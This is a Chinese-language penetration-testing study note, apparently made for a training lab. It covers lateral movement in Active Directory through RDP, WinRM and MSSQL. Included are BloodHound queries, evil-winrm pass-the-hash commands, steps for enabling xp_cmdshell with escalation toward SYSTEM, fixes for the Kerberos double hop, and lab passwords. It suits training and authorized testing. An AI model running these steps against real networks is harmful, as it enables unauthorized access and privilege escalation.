## 學習目標

- 列舉哪些使用者可透過 RDP / WinRM / MSSQL 存取目標主機。
- 用 BloodHound Cypher 查詢 CanRDP / CanPSRemote / SQLAdmin 邊。
- 用 Enter-PSSession 與 evil-winrm 建立 WinRM 遠端會話。
- 用 PowerUpSQL 與 mssqlclient.py 列舉並利用 MSSQL 執行個體。
- 理解 Kerberos Double Hop 問題成因，並套用兩種繞過方案。

---

## 理論基礎

```text
橫向移動三大路徑（本章聚焦）：
  ┌──────────────────────────────────────────────────────────────┐
  │ 協定     │ 預設埠 │ 列舉群組                    │ BloodHound  │
  ├──────────────────────────────────────────────────────────────┤
  │ RDP      │ 3389   │ Remote Desktop Users         │ CanRDP      │
  │ WinRM    │ 5985   │ Remote Management Users      │ CanPSRemote │
  │ MSSQL    │ 1433   │ SQL 登入帳號（DB 層級）       │ SQLAdmin    │
  └──────────────────────────────────────────────────────────────┘

前提：已取得網域使用者帳號，需判斷帳號對哪些主機有哪些存取管道。
```

---

## 一、RDP 存取列舉

### 理論

```text
Remote Desktop Users 群組 → 成員可 RDP 登入該主機
  → 本機群組（每台主機獨立）
  → 目標：找出我控制的帳號是否在此群組，或可滲透此群組的成員

BloodHound CanRDP 邊：
  → 從使用者/群組 → 指向電腦 → 代表可 RDP 登入
```

```powershell
# 列舉指定主機的 Remote Desktop Users 群組成員
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# 輸出欄位判讀：
# ComputerName → 目標主機名稱
# GroupName    → Remote Desktop Users
# MemberName   → 帳號（含網域前綴，如 INLANEFREIGHT\Domain Users）
# SID          → 成員 SID
# IsGroup      → True = 群組（需展開確認個別成員）
# IsDomain     → True = 網域物件
```

```cypher
// BloodHound Cypher — 查詢 CanRDP 邊
MATCH p=(u:User)-[:CanRDP]->(c:Computer) RETURN p
```

## 二、WinRM 存取列舉

### 理論

```text
Remote Management Users 群組 → 成員可透過 WinRM（PS Remoting）連線
  → 預設埠 5985（HTTP）/ 5986（HTTPS）
  → PowerShell Enter-PSSession / Invoke-Command 都走此管道

工具選擇：
  → Windows 端：Enter-PSSession（內建）
  → Linux 端：evil-winrm（Ruby gem，支援 Pass-the-Hash）
```

```powershell
# 列舉指定主機的 Remote Management Users 群組成員
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# 建立 WinRM 會話（Windows 端，已有憑證）
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
# $cred = Get-Credential 或 New-Object PSCredential("USER", (ConvertTo-SecureString "PASS" -AsPlainText -Force))
```

```cypher
// BloodHound Cypher — 查詢 CanPSRemote 邊（哪些帳號可 WinRM 到哪些主機）
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote]->(c:Computer)
RETURN p2
```

```bash
# Linux 端 evil-winrm — 密碼登入
evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2

# Linux 端 evil-winrm — NTLM 雜湊登入（Pass-the-Hash）
evil-winrm -i 10.129.201.234 -u forend -H 9d4feee98a...

# 安裝（若缺少）
gem install evil-winrm

# 旗標說明：
# -i  → 目標 IP
# -u  → 使用者名稱
# -p  → 密碼（明文）
# -H  → NTLM 雜湊（NT 部分，無 LM）
```

## 三、MSSQL 存取列舉與利用

### 理論

```text
MSSQL（SQL Server）常見於企業環境，提供多種橫向移動路徑：
  → xp_cmdshell → 執行系統指令（需 SA 或 sysadmin 角色）
  → SeImpersonatePrivilege → SQL Server 服務帳號預設持有 → JuicyPotato / PrintSpoofer

PowerUpSQL 工具流程：
  1. Get-SQLInstanceDomain → 列舉網域內所有 MSSQL 執行個體
  2. Get-SQLQuery           → 測試連線並執行查詢（確認存取權）
  
mssqlclient.py（Impacket）：
  → Linux 端連線工具，支援 Windows 整合驗證（-windows-auth）
  → 連線後可啟用並使用 xp_cmdshell
```

```powershell
# 列舉網域內所有 MSSQL 執行個體（PowerUpSQL）
Get-SQLInstanceDomain

# 輸出欄位：
# ComputerName   → 主機名稱
# Instance       → 執行個體名稱（如 ACADEMY-EA-DB01\SQLEXPRESS）
# DomainAccount  → 執行服務的帳號

# 測試當前帳號是否可連線（PowerUpSQL）
Get-SQLQuery -Verbose -Instance "ACADEMY-EA-DB01\SQLEXPRESS,1433" -query "select @@servername"
# 有回應 → 當前帳號可登入此 MSSQL 執行個體
```

```cypher
// BloodHound Cypher — 查詢 SQLAdmin 邊（哪些帳號是哪些 MSSQL 主機的 SA）
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin]->(c:Computer)
RETURN p2
```

```bash
# Linux 端 mssqlclient.py 連線（Windows 整合驗證）
mssqlclient.py INLANEFREIGHT/damundsen@172.16.5.150 -windows-auth
# -windows-auth → 使用 Kerberos/NTLM 驗證（而非 SQL 本地帳號）

# 連線後啟用 xp_cmdshell
SQL> enable_xp_cmdshell
# 若無法直接啟用，先執行：
SQL> sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# 執行系統指令
SQL> xp_cmdshell whoami
# 輸出：nt service\mssql$sqlexpress（SQL Server 服務帳號）

SQL> xp_cmdshell whoami /priv
# 關鍵項目：SeImpersonatePrivilege → Enabled
# → 可利用 PrintSpoofer / JuicyPotato 提權至 SYSTEM
```

## 四、Kerberos Double Hop 問題

### 理論

```text
Double Hop 問題成因：
  → Kerberos 驗證流程：使用者登入 → 取得 TGT（儲存在本機）
  → 存取服務時：以 TGT 申請 TGS（服務票券），TGS 只對目標服務有效
  → WinRM 連線後：遠端主機只收到 HTTP TGS，TGT 未轉發
  → 在遠端 PS 會話內執行 AD 查詢 → 沒有 TGT → 無法向 DC 驗證 → 失敗

驗證方式（確認問題存在）：
  → Enter-PSSession 進入遠端主機後執行 klist
  → 只看到 HTTP 服務的 TGS，看不到 TGT → Double Hop 問題確認

兩種繞過方案：
  方案一：PSCredential 物件 + -Credential（快速，每次指令都需加）
  方案二：Register-PSSessionConfiguration（持久，建立專用會話配置）
```

```powershell
# 確認 Double Hop 問題（在 WinRM 會話內）
klist
# 輸出：只有 HTTP/ACADEMY-EA-MS01@INLANEFREIGHT.LOCAL 的 TGS
# 沒有 krbtgt TGT → 無法存取 DC / 其他 AD 服務
```

### 方案一：PSCredential + -Credential 旗標

```text
原理：
  → 在遠端 PS 會話內建立 PSCredential 物件，帶入明文帳號密碼
  → 每次呼叫 PowerView 等工具時附上 -Credential → 工具以此憑證重新驗證
  → 繞過 TGT 限制（直接以密碼取新 TGT 完成驗證）

缺點：每次指令都要加 -Credential，略繁瑣。
```

```powershell
# 方案一：在 WinRM 會話內建立 PSCredential 並使用

# 第一步：建立 SecureString 密碼與 PSCredential 物件
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# 第二步：在所有 AD 查詢指令附上 -Credential（或 -Cred）
Get-DomainUser -SPN -Credential $Cred
Get-DomainGroupMember -Identity "Enterprise Admins" -Credential $Cred
Get-DomainObject -Identity "DC=inlanefreight,DC=local" -Credential $Cred

# 重點：-Credential 讓 PowerView 以 backupadm 的憑證向 DC 申請新票券
# → 不依賴已有的 TGT 快取
```

### 方案二：Register-PSSessionConfiguration（持久化解法）

```text
原理：
  → 在遠端主機上建立自訂的 PS Session 配置（名稱如 sess）
  → -RunAsCredential 指定具有權限的帳號
  → 後續連線時 -ConfigurationName sess → 會話以 RunAs 帳號執行
  → 等同於直接以目標帳號身份執行，TGT 問題自動解決

優點：建立一次後不需每次加 -Credential。
前提：需有本機管理員或足夠的 PS Remoting 權限才能 Register。
```

```powershell
# 方案二：建立自訂 PS Session 配置（在遠端主機上執行）

# 第一步：建立 RunAs 帳號的 PSCredential
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# 第二步：在遠端主機上註冊自訂 Session 配置
Register-PSSessionConfiguration -Name sess -RunAsCredential $Cred
# → 建立名為 sess 的 Session 配置，以 backupadm 身份執行

# 第三步：重啟 WinRM 服務使配置生效（必要）
Restart-Service WinRM
# 注意：重啟後目前的 PSSession 會斷線，需重新連入

# 第四步：以新配置重新連入（從攻擊機執行）
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $Cred -ConfigurationName sess
# -ConfigurationName sess → 指定使用剛建立的 Session 配置
# 此時會話以 backupadm 帳號執行，TGT 可正常取得

# 第五步：在新 Session 內驗證（klist 應能看到 TGT）
klist
# 應看到 krbtgt 票券 → 問題解決

# PowerView 指令不再需要 -Credential
Get-DomainUser -SPN
Get-DomainGroupMember -Identity "Enterprise Admins"
```

## 判斷邏輯

```
取得網域帳號 → 列舉橫向移動路徑
│
├── RDP（埠 3389）
│   └── Get-NetLocalGroupMember "Remote Desktop Users"
│       └── 帳號在群組內 → xfreerdp / mstsc 登入
│
├── WinRM（埠 5985）
│   └── Get-NetLocalGroupMember "Remote Management Users"
│       ├── Windows 端 → Enter-PSSession -ComputerName -Credential
│       └── Linux 端 → evil-winrm -i -u -p 或 -H（Pass-the-Hash）
│           └── 進入 WinRM 後執行 AD 查詢失敗（Double Hop）？
│               ├── 方案一：$Cred = PSCredential + -Credential 每次加
│               └── 方案二：Register-PSSessionConfiguration -RunAsCredential → Restart-Service WinRM → Enter-PSSession -ConfigurationName
│
└── MSSQL（埠 1433）
    ├── Windows 端：PowerUpSQL Get-SQLInstanceDomain → Get-SQLQuery
    ├── Linux 端：mssqlclient.py DOMAIN/USER@IP -windows-auth
    └── 連線後：
        ├── enable_xp_cmdshell → xp_cmdshell whoami /priv
        └── SeImpersonatePrivilege Enabled → PrintSpoofer 提權至 SYSTEM
```

## 速查表

```powershell
# RDP 群組列舉
Get-NetLocalGroupMember -ComputerName TARGET -GroupName "Remote Desktop Users"

# WinRM 群組列舉
Get-NetLocalGroupMember -ComputerName TARGET -GroupName "Remote Management Users"

# MSSQL 執行個體列舉（PowerUpSQL）
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "HOST\INSTANCE,1433" -query "select @@servername"

# WinRM 連線（Windows）
Enter-PSSession -ComputerName TARGET -Credential $cred

# Double Hop 確認
klist  # 只看到 HTTP TGS = Double Hop 問題

# Double Hop 解法一（PSCredential）
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', (ConvertTo-SecureString 'PASS' -AsPlainText -Force))
Get-DomainUser -Credential $Cred

# Double Hop 解法二（Session 配置）
Register-PSSessionConfiguration -Name sess -RunAsCredential $Cred
Restart-Service WinRM
Enter-PSSession -ComputerName TARGET -Credential $Cred -ConfigurationName sess
```

# Linux - WinRM（evil-winrm）
evil-winrm -i TARGET_IP -u USER -p PASS
